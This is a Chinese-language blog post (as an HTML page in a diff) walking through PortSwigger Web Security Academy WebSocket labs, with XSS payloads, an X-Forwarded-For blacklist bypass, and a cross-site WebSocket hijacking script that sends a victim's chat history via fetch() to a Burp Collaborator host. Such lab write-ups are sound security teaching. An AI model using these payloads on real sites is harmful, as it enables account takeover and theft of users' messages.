@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"secdroid.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="0x01. PortSwigger Web Security AcademyPortSwigger Web Security Academy 是 Burp Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。 本篇文章讲解 Web Security Academy 之中的 WebSockets 章节。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Burp Web Academy WebSockets">
+<meta property="og:url" content="https://secdroid.github.io/2025/02/15/burp-web-academy-websockets/index.html">
+<meta property="og:site_name" content="SecDroid">
+<meta property="og:description" content="0x01. PortSwigger Web Security AcademyPortSwigger Web Security Academy 是 Burp Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。 本篇文章讲解 Web Security Academy 之中的 WebSockets 章节。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://secdroid.github.io/images/burp-websocket-xss-payload-in-json.webp">
+<meta property="article:published_time" content="2025-02-15T04:45:37.680Z">
+<meta property="article:modified_time" content="2025-02-15T04:45:30.000Z">
+<meta property="article:author" content="Livermore">
+<meta property="article:tag" content="CSRF">
+<meta property="article:tag" content="WebSocket">
+<meta property="article:tag" content="XSS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://secdroid.github.io/images/burp-websocket-xss-payload-in-json.webp">
+
+
+<link rel="canonical" href="https://secdroid.github.io/2025/02/15/burp-web-academy-websockets/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://secdroid.github.io/2025/02/15/burp-web-academy-websockets/","path":"2025/02/15/burp-web-academy-websockets/","title":"Burp Web Academy WebSockets"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Burp Web Academy WebSockets | SecDroid</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">SecDroid</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">A security researcher who's looking for a job</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>链接</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-PortSwigger-Web-Security-Academy"><span class="nav-number">1.</span> <span class="nav-text">0x01. PortSwigger Web Security Academy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-WebSockets"><span class="nav-number">2.</span> <span class="nav-text">0x02. WebSockets</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-Lab-Manipulating-WebSocket-messages-to-exploit-vulnerabilities"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 Lab: Manipulating WebSocket messages to exploit vulnerabilities</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-Lab-Cross-site-WebSocket-hijacking"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 Lab: Cross-site WebSocket hijacking</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-Lab-Manipulating-the-WebSocket-handshake-to-exploit-vulnerabilities"><span class="nav-number">2.3.</span> <span class="nav-text">2.3 Lab: Manipulating the WebSocket handshake to exploit vulnerabilities</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%B0%8F%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">0x03. 小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3"><span class="nav-number">4.</span> <span class="nav-text">0x04. 参考文档</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Livermore</p>
+  <div class="site-description" itemprop="description">SecDroid's Diary</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://secdroid.github.io/2025/02/15/burp-web-academy-websockets/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Livermore">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SecDroid">
+      <meta itemprop="description" content="SecDroid's Diary">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Burp Web Academy WebSockets | SecDroid">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Burp Web Academy WebSockets
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-02-15 12:45:37 / 修改时间：12:45:30" itemprop="dateCreated datePublished" datetime="2025-02-15T12:45:37+08:00">2025-02-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/" itemprop="url" rel="index"><span itemprop="name">Vulnerability</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/Web/Burp-Web-Academy/" itemprop="url" rel="index"><span itemprop="name">Burp Web Academy</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="0x01-PortSwigger-Web-Security-Academy"><a href="#0x01-PortSwigger-Web-Security-Academy" class="headerlink" title="0x01. PortSwigger Web Security Academy"></a>0x01. PortSwigger Web Security Academy</h2><p>PortSwigger Web Security Academy 是 <a href="https://secdroid.github.io/tags/Burp/">Burp</a> Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。</p>
+<p>本篇文章讲解 <a href="https://secdroid.github.io/categories/Vulnerability/Web/Burp-Web-Academy/">Web Security Academy</a> 之中的 WebSockets 章节。</p>
+<span id="more"></span>
+
+<h2 id="0x02-WebSockets"><a href="#0x02-WebSockets" class="headerlink" title="0x02. WebSockets"></a>0x02. WebSockets</h2><h3 id="2-1-Lab-Manipulating-WebSocket-messages-to-exploit-vulnerabilities"><a href="#2-1-Lab-Manipulating-WebSocket-messages-to-exploit-vulnerabilities" class="headerlink" title="2.1 Lab: Manipulating WebSocket messages to exploit vulnerabilities"></a>2.1 Lab: Manipulating WebSocket messages to exploit vulnerabilities</h3><blockquote>
+<p>his online shop has a live chat feature implemented using WebSockets.</p>
+<p>Chat messages that you submit are viewed by a support agent in real time.</p>
+<p>To solve the lab, use a WebSocket message to trigger an <code>alert()</code> popup in the support agent’s browser.</p>
+</blockquote>
+<p>Burp Suite 支持 WebSocket 消息的捕获和重放，就和 HTTP 消息一样。而分析聊天功能，发现代码位于 <code>/resources/js/chat.js</code>，其中消息在发出之前会进行转义：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">htmlEncode</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (chatForm.<span class="title function_">getAttribute</span>(<span class="string">&quot;encode&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">String</span>(str).<span class="title function_">replace</span>(<span class="regexp">/[&#x27;&quot;&lt;&gt;&amp;\r\n\\]/gi</span>, <span class="keyword">function</span> (<span class="params">c</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> lookup = &#123;<span class="string">&#x27;\\&#x27;</span>: <span class="string">&#x27;&amp;#x5c;&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>: <span class="string">&#x27;&amp;#x0d;&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>: <span class="string">&#x27;&amp;#x0a;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>: <span class="string">&#x27;&amp;quot;&#x27;</span>,</span><br><span class="line">                          <span class="string">&#x27;&lt;&#x27;</span>: <span class="string">&#x27;&amp;lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>: <span class="string">&#x27;&amp;gt;&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>: <span class="string">&#x27;&amp;#39;&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>: <span class="string">&#x27;&amp;amp;&#x27;</span>&#125;;</span><br><span class="line">            <span class="keyword">return</span> lookup[c];</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因此，可以通过多种方式进行绕过：</p>
+<ul>
+<li>修改 <code>chatForm</code> 的 <code>encode</code> 属性</li>
+<li>重放 WebSocket 消息</li>
+</ul>
+<p>注意，消息的传递基于 JSON 实现，部分字符会被 JSON 强制转义，可能导致 Payload 失效，比如：</p>
+<ul>
+<li>发送 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，服务器返回 <code>&lt;script&gt;alert(1)&lt;\/script&gt;</code></li>
+<li>发送 <code>&lt;img src=1 onerror=&#39;alert(1)&#39;&gt;</code> 可以正常触发 XSS</li>
+</ul>
+<p><img src="/images/burp-websocket-xss-payload-in-json.webp" alt="Burp WebSocket XSS Payload"></p>
+<h3 id="2-2-Lab-Cross-site-WebSocket-hijacking"><a href="#2-2-Lab-Cross-site-WebSocket-hijacking" class="headerlink" title="2.2 Lab: Cross-site WebSocket hijacking"></a>2.2 Lab: Cross-site WebSocket hijacking</h3><blockquote>
+<p>This online shop has a live chat feature implemented using WebSockets.</p>
+<p>To solve the lab, use the exploit server to host an HTML&#x2F;JavaScript payload that uses a <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking">cross-site WebSocket hijacking attack</a> to exfiltrate the victim’s chat history, then use this gain access to their account.</p>
+</blockquote>
+<p>前面的 XSS 漏洞修复了，服务端会对 JSON 中的特殊字符进行转义，比如 <code>&lt;</code> 转义为 <code>&amp;lt;</code>，另外 Cookie 的属性为 <code>HttpOnly; SameSite=None</code>，所以 XSS 本身也无法读取 Cookie。</p>
+<p>观察聊天室 WebSocket 请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/chat</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0aff0043031e0aab811adec30092005d.web-security-academy.net</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Upgrade</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://0aff0043031e0aab811adec30092005d.web-security-academy.net</span><br><span class="line"><span class="attribute">Sec-Websocket-Version</span><span class="punctuation">: </span>13</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=04DgJC8U09vaRz5nu7SSMHRg23wmPVlt</span><br><span class="line"><span class="attribute">Sec-Websocket-Key</span><span class="punctuation">: </span>dHTCPBrLBw+3ZWT8VLF3Gw==</span><br></pre></td></tr></table></figure>
+
+<p>看起来仅仅使用了 <code>Cookie</code>，注意 <code>Sec-WebSocket-Key</code> 没有鉴权作用，仅仅用作 WebSocket 请求的一部分。</p>
+<p>构造如下 Exploit 代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&#x27;wss://0aff0043031e0aab811adec30092005d.web-security-academy.net/chat&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    ws.<span class="property">onopen</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123; ws.<span class="title function_">send</span>(<span class="string">&#x27;READY&#x27;</span>) &#125;;</span></span><br><span class="line"><span class="language-javascript">    ws.<span class="property">onmessage</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(<span class="string">&#x27;https://1z1qe5fatonj4ykecjnx63e8tzzqnib7.oastify.com&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>, <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>, <span class="attr">body</span>: event.<span class="property">data</span></span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码解读：</p>
+<ul>
+<li>建立 WebSocket 连接，普通协议使用 <code>ws://</code>，安全协议使用 <code>wss://</code></li>
+<li>观察聊天室协议交互方式，客户端需要发送 <code>READY</code> 消息</li>
+<li>当 WebSocket 收到消息时，会调用 <code>onmessage</code> 回调函数，有两种方式注册（<code>event.data</code> 就是消息内容）<ul>
+<li><code>addEventListener(&quot;message&quot;, (event) =&gt; &#123;&#125;);</code></li>
+<li><code>onmessage = (event) =&gt; &#123;&#125;;</code></li>
+</ul>
+</li>
+<li><code>fetch</code> 用于触发 HTTP 请求（<strong>注意是访问攻击者的域名</strong>）<ul>
+<li><code>mode</code> 用于指明请求是否可以跨域<ul>
+<li><code>cors</code> 是默认模式，表明遵守 <code>CORS</code> 设定</li>
+<li><code>same-origin</code> 标识完全禁止跨域请求</li>
+<li><code>no-cors</code> 标识忽略 <code>CORS</code> 设定</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>代码的功能是通过 WebSocket 的形式触发 <a href="https://secdroid.github.io/2025/02/12/burp-web-academy-csrf-cross-site-request-forgery/">CSRF 漏洞</a>，然后将聊天消息转发给 <a href="https://secdroid.github.io/2025/01/02/burp-web-academy-os-command-injection/">Burp Collaborator</a>，本质上是 WebSocket 版本的 CSRF 漏洞的利用。</p>
+<h3 id="2-3-Lab-Manipulating-the-WebSocket-handshake-to-exploit-vulnerabilities"><a href="#2-3-Lab-Manipulating-the-WebSocket-handshake-to-exploit-vulnerabilities" class="headerlink" title="2.3 Lab: Manipulating the WebSocket handshake to exploit vulnerabilities"></a>2.3 Lab: Manipulating the WebSocket handshake to exploit vulnerabilities</h3><blockquote>
+<p>This online shop has a live chat feature implemented using WebSockets.</p>
+<p>It has an aggressive but flawed XSS filter.</p>
+<p>To solve the lab, use a WebSocket message to trigger an <code>alert()</code> popup in the support agent’s browser.</p>
+</blockquote>
+<p>尝试直接通过 WebSocket 发送 XSS Payload，提示检测到攻击：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;&lt;img src=1 onerror=&#x27;alert(1)&#x27;&gt;&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;error&quot;</span><span class="punctuation">:</span><span class="string">&quot;Attack detected: Event handler&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>刷新页面居然提示被拉黑了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;This address is blacklisted&quot;</span><br></pre></td></tr></table></figure>
+
+<p>使用 <a href="https://secdroid.github.io/2025/01/13/burp-web-academy-authentication/">X-Forwarded-For</a> 可以绕过黑名单，但是每次检测到 XSS 就会拉黑，所以需要不断重复绕过操作。而 XSS 绕过，就看技术了，参考了官方答案：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;&lt;img src=1 OnError=alert`1`&gt;&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>自己测只能盲测，看不到具体的过滤逻辑。</p>
+<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03. 小结"></a>0x03. 小结</h2><ul>
+<li>JSON 强制转义可能影响 XSS Payload 的有效性</li>
+<li>WebSocket 版本的 CSRF 漏洞利用</li>
+<li><code>fetch</code> API</li>
+<li>XSS 绕过</li>
+</ul>
+<h2 id="0x04-参考文档"><a href="#0x04-参考文档" class="headerlink" title="0x04. 参考文档"></a>0x04. 参考文档</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/all-labs#websockets">https://portswigger.net/web-security/all-labs#websockets</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking">https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking</a></li>
+<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-WebSocket-Key">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-WebSocket-Key</a></li>
+<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/WebSocket/message_event">https://developer.mozilla.org/en-US/docs/Web/API/WebSocket/message_event</a></li>
+<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch">https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch</a></li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CSRF/" rel="tag"># CSRF</a>
+              <a href="/tags/WebSocket/" rel="tag"># WebSocket</a>
+              <a href="/tags/XSS/" rel="tag"># XSS</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/02/12/burp-web-academy-csrf-cross-site-request-forgery/" rel="prev" title="Burp Web Academy CSRF 跨站请求伪造">
+                  <i class="fa fa-angle-left"></i> Burp Web Academy CSRF 跨站请求伪造
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Livermore</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
